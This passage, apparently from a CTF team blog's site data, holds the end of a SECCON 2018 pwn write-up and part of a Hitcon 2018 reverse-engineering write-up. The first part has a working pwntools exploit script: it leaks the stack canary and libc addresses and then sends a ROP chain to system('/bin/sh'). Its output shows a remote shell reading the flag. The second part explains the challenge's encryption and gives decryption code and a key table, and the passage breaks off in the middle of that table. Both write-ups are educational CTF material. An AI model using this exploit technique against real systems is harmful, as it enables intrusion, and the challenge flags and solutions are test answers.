*0x4013C9# b *0x40148D# ''')r.recv()r.sendline('2'*15)r.recv()r.sendline('3')r.recv()r.sendline('4')log.info('----------Searching for the offset-------------') while LEAKED_ADDR != 0x414141414141 and i &lt; 0xff: LEAKED_ADDR = leakAddr(p8(i)) log.info(\"LEAKED ADDR 0x%x 0x%x\" % (LEAKED_ADDR,i)) i += 0x10if i &gt; 0xff: print 'Unluckly couldn\\'t find the string position' r.close() exit(0) LEAKED_ADDR = leakAddr(p8(i))log.info('------------------Offset Found-----------------')CANARY_ADDR = LEAKED_ADDR+0x28log.info(\"LEAKED ADDR 0x%x\" % LEAKED_ADDR)log.info(\"CANARY ADDR 0x%x\" % (CANARY_ADDR))CANARY = leakAddr(p64(CANARY_ADDR) ,bytes_to_read=8)log.info(\"Canary 0x%x\" % CANARY)READ = leakAddr(p64(binary.got['read']))LIBCBASE = READ - libc.symbols['read']SYSTEM = LIBCBASE + libc.symbols['system']BINSH = LIBCBASE + libc.search('/bin/sh\\x00').next()EXIT = LIBCBASE + libc.symbols['exit']log.info(\"READ 0x%x\" % READ)log.info(\"LIBC 0x%x\" % LIBCBASE)log.info(\"SYSTEM 0x%x\" % SYSTEM)log.info(\"BINSH 0x%x\" % BINSH)r.recv()ropchain = ''ropchain += p64(POPRET) # POP RDI; RETropchain += p64(BINSH) # BINSH ADDRESS ARG[1]ropchain += p64(SYSTEM) # SYSTEM function \"call\"ropchain += p64(EXIT) # EXITr.sendline('1')r.recv()r.sendline(p64(0) * 7 + p64(CANARY) + p64(0)*3 + ropchain)r.recv()r.sendline('0')r.recv()r.interactive() Running it: 12345678910111213141516171819202122232425262728293031323334353637$ python profile.py [*] '/ctf/work/ctf/seccon2018/pwn/profile/profile_e814c1a78e80ed250c17e94585224b3f3be9d383' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000)[*] '/ctf/work/ctf/seccon2018/pwn/profile/libc-2.23' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled[+] Opening connection to profile.pwn.seccon.jp on port 28553: Done[*] ----------Searching for the offset-------------[*] LEAKED ADDR 0x323232320034 0x0[*] LEAKED ADDR 0x7ffc15b74720 0x10[*] LEAKED ADDR 0x323232323232 0x20[*] LEAKED ADDR 0x7ffc15b74740 0x30[*] LEAKED ADDR 0x600034 0x40[*] LEAKED ADDR 0x7ffc15b74760 0x50[*] LEAKED ADDR 0x414141414141 0x60[*] ------------------Offset Found-----------------[*] LEAKED ADDR 0x7ffc15b74770[*] CANARY ADDR 0x7ffc15b74798[*] Canary 0x16e9ecb89abcf100[*] READ 0x7f2e75ce7250[*] LIBC 0x7f2e75bf0000[*] SYSTEM 0x7f2e75c35390[*] BINSH 0x7f2e75d7cd57[*] Switching to interactive modeWrong input...$ lsflag.txtprofile$ cat flag.txtSECCON&#123;57r1ng_l0c4710n_15_n07_0nly_h34p&#125;","categories":[{"name":"Pwn","slug":"Pwn","permalink":"https://teamrocketist.github.io/categories/Pwn/"},{"name":"x64","slug":"Pwn/x64","permalink":"https://teamrocketist.github.io/categories/Pwn/x64/"},{"name":"Stack Issue","slug":"Pwn/x64/Stack-Issue","permalink":"https://teamrocketist.github.io/categories/Pwn/x64/Stack-Issue/"},{"name":"Stack Overflow","slug":"Pwn/x64/Stack-Issue/Stack-Overflow","permalink":"https://teamrocketist.github.io/categories/Pwn/x64/Stack-Issue/Stack-Overflow/"},{"name":"Canary Leak","slug":"Pwn/x64/Stack-Issue/Canary-Leak","permalink":"https://teamrocketist.github.io/categories/Pwn/x64/Stack-Issue/Canary-Leak/"}],"tags":[{"name":"rop","slug":"rop","permalink":"https://teamrocketist.github.io/tags/rop/"},{"name":"stack_overflow","slug":"stack-overflow","permalink":"https://teamrocketist.github.io/tags/stack-overflow/"},{"name":"c++","slug":"c","permalink":"https://teamrocketist.github.io/tags/c/"},{"name":"malloc_usable_size","slug":"malloc-usable-size","permalink":"https://teamrocketist.github.io/tags/malloc-usable-size/"},{"name":"std::string","slug":"std-string","permalink":"https://teamrocketist.github.io/tags/std-string/"},{"name":"seccon2018","slug":"seccon2018","permalink":"https://teamrocketist.github.io/tags/seccon2018/"}]},{"title":"[Reverse] Hitcon 2018 - EOP","slug":"Reverse-Hitcon-2018-EOP","date":"2018-10-22T21:35:34.000Z","updated":"2018-10-24T23:59:47.485Z","comments":true,"path":"2018/10/22/Reverse-Hitcon-2018-EOP/","link":"","permalink":"https://teamrocketist.github.io/2018/10/22/Reverse-Hitcon-2018-EOP/","excerpt":"","text":"EOPEOP.eop-811afa1b9fb0c0719a75afd316ea2c57Author: david942j29 Teams solved. Quite challenging reverse engineering, well at least it was for me, the binary wasn’t very hard to understand perhaps it had some strange exceptions “mechanics” which were being to used to jump to other parts of the code in a sequence order. Using IDA for this challenge was crucial for me at first I was just trying to use radare2 and gdb but I got quickly overwhelmed by the code, both static and dynamic analysis were made with IDA, IDA is good because you can easily navigate through control flow graphs while debugging and it’s very easy to change the views, one thing that really helped me was to create a view to keep track of some global variables that were being used for encryption in this challenge. You must be asking how I debugged an elf while using IDA on Windows, this can be done via remote debugging (the elf runs on an external linux machine) which is supported by IDA if you want to know how to do this. This binary is using multiple exceptions to manage the control flow of the program identifying this isn’t very hard after some trial and error I easily found where the exceptions were being thrown I just setted up alot of breakpoints while observing some global variables changes. The real deal in this challenge was to deal with the extensive encryption function I ended up very tired until I figured out the function. The ida pseudo c code converter wasn’t working at all so I needed to read pure assembly which isn’t a big problem for me but it definitively takes more time to read, luckily after fully understanding the encrypting function writing the code to reverse it was very easy. Identifying the size of the flag and extractBy opening the main function in IDA we can quickly see how much the size is the flag: Scrolling down a little bit we can quickly find where the binary is checking if the flag we inserted had the correct size, The encrypted flag is already stored in a global var, we can extract it using ida, you can do this by double clicking on the offset and then edit -&gt; export data (or shift + e while selecting it ) and you can select it to export to c like I did, you then can just adapt to other languages if you are using a different language like me (in my case python). Some Globals already showing up in the main function graph: Exporting it: Keep in mind that I renamed some functions and vars in ida so it might be a little different from yours (if youwant to check my idb ask it on the comments and I’ll upload it), Still looking at the main function, we can notice after the cmp [rbp+var_1C], 0x2f, the first 16 bytes of the string are extracted to two global variables flaginput and flaginput2 (renamed by me in IDA): As you notice from the image above after the split it’s going to call Alloc_throw_catch (renamed) this is where all the exception magic is going to happen: Keep in mind that begin_catch actually updates the value on the heap before we jump in CALL RAX so I assumed that begin does something besides limiting the limits of the catch. Putting a break on CALL RAX is smart because this is going to be executed multiple times and it’s from here we are going to jump into the encryption functions. Encryption FunctionsAfter jumping from CALL RAX we are going to jump into 1st encrytion function, the encryption process is separated in a lot of function, but they are very similar to each other some times they are even equal, the process is resumed in the box bellow: 1234567891011XorInputFlag|ReverveXoredString |Repeat 8 timesShrAddXor -&gt; AddAddXor -&gt; Ror -&gt; Rol -&gt; AddAddXor(Slighty different from the 1st AddAddXor)End Repeat|Xor|ExchangeByteOrders XorInputFlagIt simply xors the first 8 bytes (inputflag) with key which is stored in a global variable (does the same for the next 8 too “inputflag2”), for the first 16 bytes (Round 1) the key is zero and when you xor something with a zero it does absolutely nothing the value remains the same. The xor key is zero because the globals are set to zero, for the next rounds they are going to filled. On the image bellow I created a view (Views -&gt; Open subviews -&gt; Disassembly) so I can track all of this Globals so I know when they are going to be modified (helped me alot for debugging the entire process). This function aplies to both inputflag and inputflag2. ReverveXoredStringReceives a string of 8 bytes () This function reverses the 1st 4 bytes of the string (returned from XorInputFlag) and then uses xor with a key stored in a global which IDA names it off_5604E325B150 (the last numbers should differ because PIE is enabled), once again you can export it to later use it for reversing, this variable is a huge table with multiple values and is constantly used by the binary. The process is repeated again for the last 4 bytes but with a different offset from the xor key table. if you are confused with all the shift lefts in assembly don’t be the shifts are only used to change the order of the bytes of the input for example: 12345String -&gt; &apos;AA&apos;String in hex -&gt; 0x4141Shift left on &apos;AA&apos; -&gt; 0x414100and now a simple OR operation can be used to insert a character in the beginning of the string:0x414100 | 0x45 = 0x414145 -&gt; &apos;EAA&apos; The first 4 bytes of string returned from XorInputFlag: The last 4 bytes of string returned XorInputFlag: Resuming it the the result of the first bytes are saved on dword_560CC63C71C0 and the last ones are saved on dword_560CC63C71C4. ShrAddXor -&gt; AddAddXor -&gt; Ror -&gt; Rol -&gt; AddAddXor(Slighty diferent from the 1st AddAddXor)This process is going to be repeated 8 times! And they only difference on each interaction is the offsets to the xor key table is increases 0x10. ShrAddXorThis function does a bunch of operations to calculate the index of 4 xor keys from the global array, it then applies 3 sequential xors as explained bellow, the result is saved in a new variable dword_560CC63C71D0 . The Function Applied to the first 4 bytes (Value coming from dword_5604E325B1C0) The function applied to the last 4 bytes are coming from the global dword_5604E325B1C4 and is going to be stored on dword_560CC63C71D4 the is the same but the order of the bytes extracted are different in this case the is4th byte, 1st byte, 2nd byte, 3rd byte and the final result is in a new variable dword_560CC63C71D4 . The Function applied to the last 4 bytes (Value coming from dword_5604E325B1C4) AddAddXorThis one is really simple but they differ from interaction to interaction regarding to the offsets, and as I said above the process is going to be repeated 8 times and the offset increases 0x10 on each operation as explained in the image bellow for the first 4 bytes: RorThis one is even simpler i just uses ror operation: the 4 bytes are extracted from dword_5604E325B1C0 and then saved to dword_5604E325B1C0 again. RolThis one is simple too it just uses rol operation: the 4 bytes are extracted from dword_5604E325B1C4 and then saved to dword_5604E325B1C4 again. AddAddXorAlmost the same as the previous AddAddXor but this one has this tricky operation lea edx, [rax + rax] which is equivalent to:1edx = (rax + rax) &amp; 0xffffffff The mask (0xffffffff) must be applied because edx is a 32 bit register, this is a little thing you need to keep in mind while writing the reverse script. The index offset to each iteration will also change here (increasing 0x10 as I mention before). The results of this function are saved in dword_560CC63C71C4 The examples given above are related to the second chunk of 8 bytes.Now for the 1st chunk of 8 bytes will run this same functions with only some differences in the offsets and the values will be saved in different globals dword_560CC63C71C8, dword_560CC63C71CC, dword_560CC63C71D8 and dword_560CC63C71DC. Xor &amp; ExchangeByteOrdersXor just xors the bytes by a key coming from the xor offset table the offsets are always the same (0x10,0x14,0x18,0x1c) for the 3 rounds after the xors and the result is stored in a new global dword_560CC63C71B0, ExchangeByteOrders will once again exchange bytes do some summations and the result is stored in a new global dword_560CC63C71B8. Bellow is the code equivalent to the assembly that comes after, since I’m running out of time I’ll post the python code now and then later I’ll post the assembly. 123456789101112131415161718192021222324252627# Xordword_560CC63C71C8 = dword_560CC63C71C8 ^ access_offstream(off_560CC63C7150, 0x10)dword_560CC63C71CC = dword_560CC63C71CC ^ access_offstream(off_560CC63C7150, 0x14)dword_560CC63C71C0 = dword_560CC63C71C0 ^ access_offstream(off_560CC63C7150, 0x18)dword_560CC63C71C4 = dword_560CC63C71C4 ^ access_offstream(off_560CC63C7150, 0x1c)dword_560CC63C71B0 = []# ExchangeByteOrdersfor dword in [dword_560CC63C71C8, dword_560CC63C71CC]: dword_560CC63C71B0 = [dword &amp; 0xff] +dword_560CC63C71B0 eax = dword &gt;&gt; 8 dword_560CC63C71B0 = [eax &amp; 0xff] +dword_560CC63C71B0 eax = dword &gt;&gt; 0x10 dword_560CC63C71B0 = [eax &amp; 0xff] +dword_560CC63C71B0 eax = dword &gt;&gt; 0x18 dword_560CC63C71B0 = [eax &amp; 0xff] +dword_560CC63C71B0dword_560CC63C71B8 = []for dword in [dword_560CC63C71C0, dword_560CC63C71C4]: dword_560CC63C71B8 = [dword &amp; 0xff] +dword_560CC63C71B8 eax = dword &gt;&gt; 8 dword_560CC63C71B8 = [eax &amp; 0xff] +dword_560CC63C71B8 eax = dword &gt;&gt; 0x10 dword_560CC63C71B8 = [eax &amp; 0xff] +dword_560CC63C71B8 eax = dword &gt;&gt; 0x18 dword_560CC63C71B8 = [eax &amp; 0xff] +dword_560CC63C71B8 Joining dword_560CC63C71B0 and dword_560CC63C71B8In the end of every encryption we end up returning to the main function and the globals dword_560CC63C71B0 and dword_560CC63C71B8 are stored next to each other in the memory which will be used to compare to the other encrypted flag. This is just for the first chunk of 16 bytes this, there is more 2 rounds to do for the rest of the characters but luckily they just repeat the same before the only thing that changes is on the first encryption function which now since the globals no longer are 0 the XorInputFlag function will make the difference. Joinining dword_560CC63C71B0 and dword_560CC63C71B8 into memory ill be the start of encrypted string we inserted Writing the reverse scriptWrite the reverse string is like writing the script from the bottom of the page to the top, it’s like rewinding a VHS tape back to the beginning of the movie, in our case we want to convert the encrypted flag value to the original flag. I wrote my script in python 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150from struct import *max_bits = 32off_560CC63C7150 = [0x6E, 0x4D, 0x1A, 0xC0, 0x36, 0x66, 0xCB, 0xA4, 0xA1, 0x5B, 0x0F, 0x5B, 0x26, 0x69, 0x26, 0x2B, 0x8F, 0xCB, 0x75, 0xEF, 0x2A, 0x22, 0x37, 0xA0, 0x9A, 0x61, 0x69, 0xBA, 0x32, 0x89, 0x79, 0x60, 0x59, 0xA8, 0x6E, 0x02, 0x93, 0x58, 0x31, 0xF1, 0xA6, 0x33, 0x59, 0x8B, 0x67, 0xAC, 0x2B, 0xE7, 0x04, 0x89, 0xCC, 0x1A, 0xEF, 0xD1, 0x48, 0x2E, 0xAB, 0xD5, 0x21, 0x3F, 0x1F, 0x5A, 0x33, 0x69, 0xF0, 0x68, 0x83, 0xBE, 0xC3, 0x84, 0xF7, 0xF1, 0x90, 0x49, 0x20, 0x18, 0x68, 0xA1, 0xCE, 0x18, 0x57, 0x91, 0x96, 0x33, 0x47, 0xF1, 0xEB, 0x21, 0x72, 0xF8, 0x7A, 0xFA, 0x6C, 0xBE, 0xE6, 0xAB, 0x7E, 0x61, 0x4E, 0x51, 0xC2, 0x3F, 0x77, 0xEC, 0x6A, 0xC3, 0x18, 0xC6, 0xA4, 0xF7, 0xCE, 0xF9, 0x01, 0xB3, 0xDC, 0x75, 0x7A, 0x8C, 0xE1, 0xAE, 0x69, 0x26, 0xF2, 0x24, 0x5F, 0x35, 0xDB, 0x9A, 0x23, 0xE1, 0x4E, 0x77, 0xA0, 0x34, 0xF4, 0xC8, 0xEF, 0x97, 0x7E, 0xF4, 0xF7, 0x7D, 0x79, 0x43, 0x45, 0x6A, 0xE4, 0xF6, 0xD5, 0x80, 0xB7, 0x05, 0x40, 0xBF, 0xE1, 0xE3, 0x32, 0x75, 0xDD, 0x54, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0B, 0xE7, 0x56, 0x56, 0x17, 0xFC, 0x43, 0x43, 0x71, 0x37, 0xBB, 0xBB, 0x85, 0xFE, 0x08, 0x08, 0xD3, 0x09, 0xD4, 0xD4, 0xFB, 0x2B, 0xE2, 0xE2, 0x1E, 0xAD, 0xA2, 0xA2, 0xB2, 0x2A, 0x73, 0x73, 0xF4, 0xC9, 0xB3, 0xB3, 0x3C, 0x33, 0x2D, 0x2D, 0xD0, 0xE4, 0x8C, 0x8C, 0x02, 0xB6, 0xB7, 0xB7, 0x59, 0x15, 0x8D, 0x8D, 0x8D, 0xF4, 0x06, 0x06, 0x5D, 0x10, 0x8A, 0x8A, 0x75, 0x32, 0xBC, 0xBC, 0xCB, 0x17, 0xC6, 0xC6, 0xC7, 0x18, 0xCF, 0xCF, 0x3E, 0x85, 0x9A, 0x9A, 0x9B, 0x53, 0xAA, 0xAA, 0x1F, 0xF6, 0x4D, 0x4D, 0x7E, 0xD5, 0xEA, 0xEA, 0x60, 0x78, 0x48, 0x48, 0x80, 0xA0, 0xE0, 0xE0, 0xCE, 0x49, 0x2E, 0x2E, 0x24, 0x2D, 0x3F, 0x3F, 0xB4, 0x99, 0xC3, 0xC3, 0x95, 0xEA, 0x14, 0x14, 0x94, 0xB1, 0xFB, 0xFB, 0x3F, 0xDE, 0x75, 0x75, 0x1D, 0x40, 0xFA, 0xFA, 0x05, 0x5E, 0xE8, 0xE8, 0x4E, 0xE9, 0xCE, 0xCE, 0x47, 0xB8, 0x2F, 0x2F, 0x4F, 0xB2, 0x21, 0x21, 0x07, 0xE8, 0x5F, 0x5F, 0xB6, 0x2F, 0x74, 0x74, 0x39, 0x6D, 0xC5, 0xC5, 0x2D, 0x7C, 0xDE, 0xDE, 0x1B, 0xF3, 0x4A, 0x4A, 0x8C, 0xAF, 0xE9, 0xE9, 0x79, 0x3D, 0xB5, 0xB5, 0x44, 0x55, 0x77, 0x77, 0x8F, 0x42, 0xB1, 0xB1, 0x04, 0x05, 0x07, 0x07, 0x9F, 0x56, 0xAD, 0xAD, 0x86, 0x13, 0x50, 0x50, 0x9A, 0x08, 0x45, 0x45, 0x98, 0xBE, 0xF2, 0xF2, 0xBC, 0x93, 0xCD, 0xCD, 0x54, 0x41, 0x6B, 0x6B, 0xC3, 0x1D, 0xC8, 0xC8, 0x4D, 0x04, 0x96, 0x96, 0xAE, 0x31, 0x66, 0x66, 0x83, 0x4D, 0xB8, 0xB8, 0x91, 0xEF, 0x13, 0x13, 0x3D, 0x68, 0xC2, 0xC2, 0xBB, 0x7B, 0x92, 0x92, 0xCA, 0x4C, 0x29, 0x29, 0xE4, 0xDD, 0xAF, 0xAF, 0x0E, 0xB9, 0xBE, 0xBE, 0xA9, 0xD9, 0x39, 0x39, 0xD2, 0x52, 0x3B, 0x3B, 0xB9, 0xCD, 0x25, 0x25, 0xE3, 0x35, 0xF0, 0xF0, 0x64, 0x7D, 0x4F, 0x4F, 0x38, 0x36, 0x2A, 0x2A, 0x19, 0x45, 0xFD, 0xFD, 0x3A, 0x80, 0x9D, 0x9D, 0xAC, 0x87, 0xD1, 0xD1, 0xD7, 0x0C, 0xD3, 0xD3, 0xD4, 0xE1, 0x8B, 0x8B, 0x8B, 0x47, 0xB6, 0xB6, 0x7B, 0x8B, 0x02, 0x02, 0x13, 0xF9, 0x44, 0x44, 0x41, 0x0B, 0x9F, 0x9F, 0x09, 0x51, 0xE1, 0xE1, 0x6C, 0x77, 0x41, 0x41, 0x50, 0x44, 0x6C, 0x6C, 0x2C, 0x27, 0x31, 0x31, 0x6B, 0x9F, 0x1E, 0x1E, 0x14, 0x11, 0x1B, 0x1B, 0x45, 0x0E, 0x98, 0x98, 0xF5, 0x92, 0x5C, 0x5C, 0x34, 0x39, 0x23, 0x23, 0x7A, 0xD0, 0xED, 0xED, 0xEE, 0x61, 0x16, 0x16, 0x90, 0xB4, 0xFC, 0xFC, 0xDC, 0xEB, 0x85, 0x85, 0xF3, 0x21, 0xEC, 0xEC, 0xAB, 0x6F, 0x8E, 0x8E, 0xB1, 0xC7, 0x2B, 0x2B, 0xED, 0x8C, 0x4E, 0x4E, 0x77, 0x84, 0x0B, 0x0B, 0xC4, 0xF5, 0x97, 0x97, 0x03, 0xED, 0x58, 0x58, 0xDE, 0x5D, 0x32, 0x32, 0xE1, 0x83, 0x47, 0x47, 0x89, 0xF1, 0x01, 0x01, 0x6D, 0x2C, 0xAE, 0xAE, 0x76, 0xDF, 0xE4, 0xE4, 0x48, 0x5A, 0x7E, 0x7E, 0x49, 0x01, 0x91, 0x91, 0xE7, 0x30, 0xF7, 0xF7, 0xC5, 0xAE, 0x78, 0x78, 0xCC, 0xFF, 0x99, 0x99, 0xD9, 0xB5, 0x6D, 0x6D, 0x1A, 0xA8, 0xA5, 0xA5, 0x55, 0x1A, 0x84, 0x84, 0xA8, 0x82, 0xD6, 0xD6, 0x6E, 0xC1, 0xF6, 0xF6, 0xAA, 0x34, 0x61, 0x61, 0x73, 0x81, 0x0C, 0x0C, 0x37, 0xD4, 0x7B, 0x7B, 0x53, 0xA9, 0x34, 0x34, 0xF1, 0x97, 0x5B, 0x5B, 0x96, 0x07, 0x4C, 0x4C, 0xDF, 0x06, 0xDD, 0xDD, 0x00, 0x00, 0x00, 0x00, 0x6F, 0x9A, 0x19, 0x19, 0x33, 0xD1, 0x7C, 0x7C, 0x32, 0x8A, 0x93, 0x93, 0x16, 0xA7, 0xAC, 0xAC, 0x81, 0xFB, 0x0F, 0x0F, 0x9C, 0xBB, 0xF5, 0xF5, 0xC1, 0xAB, 0x7F, 0x7F, 0x5F, 0xA6, 0x3D, 0x3D, 0xE6, 0x6B, 0x18, 0x18, 0x30, 0x3C, 0x24, 0x24, 0xF8, 0xC6, 0xBA, 0xBA, 0xE9, 0x89, 0x49, 0x49, 0xBF, 0x7E, 0x95, 0x95, 0x58, 0x4E, 0x62, 0x62, 0xBD, 0xC8, 0x22, 0x22, 0x5B, 0xA3, 0x3A, 0x3A, 0xF0, 0xCC, 0xB4, 0xB4, 0x5E, 0xFD, 0xD2, 0xD2, 0x01, 0x5B, 0xEF, 0xEF, 0x22, 0x9E, 0x8F, 0x8F, 0xA4, 0x8D, 0xDF, 0xDF, 0x97, 0x5C, 0xA3, 0xA3, 0xA7, 0x60, 0x87, 0x87, 0x99, 0xE5, 0x1D, 0x1D, 0xB7, 0x74, 0x9B, 0x9B, 0xAF, 0x6A, 0x89, 0x89, 0x78, 0x66, 0x5A, 0x5A, 0x29, 0x79, 0xD9, 0xD9, 0xEC, 0xD7, 0xA1, 0xA1, 0xEA, 0x64, 0x11, 0x11, 0xE2, 0x6E, 0x1F, 0x1F, 0x62, 0xCE, 0xFF, 0xFF, 0xC8, 0xFA, 0x9E, 0x9E, 0xE5, 0x86, 0x40, 0x40, 0x56, 0xF7, 0xDC, 0xDC, 0x4B, 0xB7, 0x26, 0x26, 0xF9, 0x9D, 0x55, 0x55, 0x74, 0x69, 0x53, 0x53, 0x1C, 0x1B, 0x15, 0x15, 0x61, 0x23, 0xA7, 0xA7, 0x7C, 0x63, 0x5D, 0x5D, 0xCF, 0x12, 0xC1, 0xC1, 0xC0, 0xF0, 0x90, 0x90, 0x4A, 0xEC, 0xC9, 0xC9, 0xFD, 0x98, 0x52, 0x52, 0x65, 0x26, 0xA0, 0xA0, 0x35, 0x62, 0xCC, 0xCC, 0xB5, 0xC2, 0x2C, 0x2C, 0x2A, 0x94, 0x81, 0x81, 0xEB, 0x3F, 0xFE, 0xFE, 0x43, 0xBD, 0x28, 0x28, 0x20, 0x28, 0x38, 0x38, 0x67, 0x90, 0x17, 0x17, 0x8A, 0x1C, 0x59, 0x59, 0xF6, 0x7F, 0x04, 0x04, 0x42, 0xE6, 0xC7, 0xC7, 0x0D, 0x54, 0xE6, 0xE6, 0x63, 0x95, 0x10, 0x10, 0x72, 0xDA, 0xE3, 0xE3, 0xCD, 0xA4, 0x76, 0x76, 0xD6, 0x57, 0x3C, 0x3C, 0x0A, 0xBC, 0xB9, 0xB9, 0x40, 0x50, 0x70, 0x70, 0xDB, 0x03, 0xDA, 0xDA, 0xA3, 0x65, 0x80, 0x80, 0xFE, 0x75, 0x0A, 0x0A, 0xAD, 0xDC, 0x3E, 0x3E, 0xB3, 0x71, 0x9C, 0x9C, 0xF7, 0x24, 0xEB, 0xEB, 0xA0, 0x88, 0xD8, 0xD8, 0x28, 0x22, 0x36, 0x36, 0x7F, 0x8E, 0x05, 0x05, 0xDD, 0xB0, 0x6A, 0x6A, 0x68, 0x72, 0x46, 0x46, 0xA5, 0xD6, 0x30, 0x30, 0x92, 0x02, 0x4B, 0x4B, 0xD1, 0xBF, 0x63, 0x63, 0x52, 0xF2, 0xDB, 0xDB, 0x2E, 0x91, 0x86, 0x86, 0x57, 0xAC, 0x33, 0x33, 0x9D, 0xE0, 0x1A, 0x1A, 0x46, 0xE3, 0xC0, 0xC0, 0xC9, 0xA1, 0x71, 0x71, 0x70, 0x6C, 0x54, 0x54, 0x2B, 0xCF, 0x6E, 0x6E, 0x66, 0xCB, 0xF8, 0xF8, 0xC2, 0x46, 0x27, 0x27, 0x26, 0x9B, 0x88, 0x88, 0xD8, 0xEE, 0x82, 0x82, 0x36, 0x8F, 0x94, 0x94, 0x23, 0xC5, 0x60, 0x60, 0x5A, 0xF8, 0xD5, 0xD5, 0x25, 0x76, 0xD0, 0xD0, 0x82, 0x16, 0x57, 0x57, 0xC6, 0x43, 0x20, 0x20, 0x84, 0xA5, 0xE7, 0xE7, 0x06, 0xB3, 0xB0, 0xB0, 0x9E, 0x0D, 0x42, 0x42, 0x4C, 0x5F, 0x79, 0x79, 0xBA, 0x20, 0x7D, 0x7D, 0xE0, 0xD8, 0xA8, 0xA8, 0xB0, 0x9C, 0xC4, 0xC4, 0x93, 0x59, 0xA4, 0xA4, 0x27, 0xC0, 0x67, 0x67, 0x08, 0x0A, 0x0E, 0x0E, 0x12, 0xA2, 0xAB, 0xAB, 0x3B, 0xDB, 0x72, 0x72, 0xFC, 0xC3, 0xBD, 0xBD, 0xB8, 0x96, 0xCA, 0xCA, 0xFA, 0x70, 0x0D, 0x0D, 0xEF, 0x3A, 0xF9, 0xF9, 0x0F, 0xE2, 0x51, 0x51, 0x6A, 0xC4, 0xF1, 0xF1, 0x2F, 0xCA, 0x69, 0x69, 0x15, 0x4A, 0xF4, 0xF4, 0xDA, 0x58, 0x35, 0x35, 0x10, 0x14, 0x1C, 0x1C, 0x88, 0xAA, 0xEE, 0xEE, 0xA1, 0xD3, 0x37, 0x37, 0xBE, 0x25, 0x7A, 0x7A, 0xF2, 0x7A, 0x03, 0x03, 0x21, 0x73, 0xD7, 0xD7, 0x5C, 0x4B, 0x65, 0x65, 0x0C, 0x0F, 0x09, 0x09, 0xFF, 0x2E, 0xE5, 0xE5, 0x31, 0x67, 0xCB, 0xCB, 0xA6, 0x3B, 0x68, 0x68, 0xD5, 0xBA, 0x64, 0x64, 0x7D, 0x38, 0xB2, 0xB2, 0x11, 0x4F, 0xF3, 0xF3, 0x87, 0x48, 0xBF, 0xBF, 0x51, 0x1F, 0x83, 0x83, 0x18, 0x1E, 0x12, 0x12, 0xE8, 0xD2, 0xA6, 0xA6, 0x8E, 0x19, 0x5E, 0x5E, 0x69, 0x29, 0xA9, 0xA9, 0xA2, 0x3E, 0x6F, 0x6F, 0x07, 0x07, 0x05, 0x04, 0x6C, 0x6C, 0x44, 0x50, 0xC1, 0xC1, 0x12, 0xCF, 0x28, 0x28, 0xBD, 0x43, 0xF6, 0xF6, 0xC1, 0x6E, 0x84, 0x84, 0x1A, 0x55, 0x3D, 0x3D, 0xA6, 0x5F, 0xBD, 0xBD, 0xC3, 0xFC, 0x9E, 0x9E, 0xFA, 0xC8, 0x48, 0x48, 0x78, 0x60, 0xD2, 0xD2, 0xFD, 0x5E, 0xD0, 0xD0, 0x76, 0x25, 0x5F, 0x5F, 0xE8, 0x07, 0x06, 0x06, 0xF4, 0x8D, 0xCC, 0xCC, 0x62, 0x35, 0xD7, 0xD7, 0x73, 0x21, 0x7A, 0x7A, 0x25, 0xBE, 0xBA, 0xBA, 0xC6, 0xF8, 0x87, 0x87, 0x60, 0xA7, 0x2E, 0x2E, 0x49, 0xCE, 0x11, 0x11, 0x64, 0xEA, 0x65, 0x65, 0x4B, 0x5C, 0x81, 0x81, 0x94, 0x2A, 0xB3, 0xB3, 0xC9, 0xF4, 0xBE, 0xBE, 0xB9, 0x0E, 0x59, 0x59, 0x1C, 0x8A, 0x41, 0x41, 0x77, 0x6C, 0x2A, 0x2A, 0x36, 0x38, 0x90, 0x90, 0xF0, 0xC0, 0xE2, 0xE2, 0x2B, 0xFB, 0x18, 0x18, 0x6B, 0xE6, 0xA4, 0xA4, 0x59, 0x93, 0xA9, 0xA9, 0x29, 0x69, 0x1A, 0x1A, 0xE0, 0x9D, 0x93, 0x93, 0x8A, 0x32, 0x1C, 0x1C, 0x14, 0x10, 0x6B, 0x6B, 0x41, 0x54, 0x0C, 0x0C, 0x81, 0x73, 0x37, 0x37, 0xD3, 0xA1, 0x4E, 0x4E, 0x8C, 0xED, 0x0B, 0x0B, 0x84, 0x77, 0x05, 0x05, 0x8E, 0x7F, 0x0F, 0x0F, 0xFB, 0x81, 0x5D, 0x5D, 0x63, 0x7C, 0xD3, 0xD3, 0x0C, 0xD7, 0x32, 0x32, 0x5D, 0xDE, 0x96, 0x96, 0x04, 0x4D, 0xF4, 0xF4, 0x4A, 0x15, 0x1E, 0x1E, 0x9F, 0x6B, 0xAD, 0xAD, 0x56, 0x9F, 0xC8, 0xC8, 0x1D, 0xC3, 0xF5, 0xF5, 0xBB, 0x9C, 0xBF, 0xBF, 0x48, 0x87, 0x3A, 0x3A, 0xA3, 0x5B, 0x98, 0x98, 0x0E, 0x45, 0x2D, 0x2D, 0x33, 0x3C, 0xB8, 0xB8, 0x4D, 0x83, 0xC2, 0xC2, 0x68, 0x3D, 0xA3, 0xA3, 0x5C, 0x97, 0x68, 0x68, 0x3B, 0xA6, 0xC6, 0xC6, 0x17, 0xCB, 0xEE, 0xEE, 0xAA, 0x88, 0xA6, 0xA6, 0xD2, 0xE8, 0xE1, 0xE1, 0x51, 0x09, 0xA8, 0xA8, 0xD8, 0xE0, 0xD8, 0xD8, 0x88, 